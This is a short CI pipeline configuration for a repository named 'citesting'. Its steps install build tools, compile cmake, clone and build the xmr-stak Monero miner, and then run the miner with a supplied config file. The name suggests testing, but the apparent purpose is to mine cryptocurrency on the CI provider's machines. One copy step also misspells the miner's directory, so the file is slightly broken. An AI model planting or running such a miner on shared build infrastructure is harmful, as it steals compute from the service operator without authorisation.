bminer415/citesting:
  PreBuild:
    - sudo apt-get update
    - sudo apt-get install -y build-essential libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev software-properties-common
    - wget http://cmake.org/files/v3.10/cmake-3.10.2.tar.gz
    - tar xf cmake-3.10.2.tar.gz
    - cd cmake-3.10.2
    - ./configure
    - make
    - make install
    #- sudo add-apt-repository ppa:george-edison55/cmake-3.x
    #- sudo apt-get update
    #- sudo apt-get install -y cmake
    - git clone https://github.com/fireice-uk/xmr-stak.git
    - mkdir xmr-stak/build
    - cd xmr-stak/build
    - cmake ..
    - make install
  Build:
    - cp config.txt xmr-stack/build/bin
    - cd xmr-stak/build/bin
    - ./xmr-stak
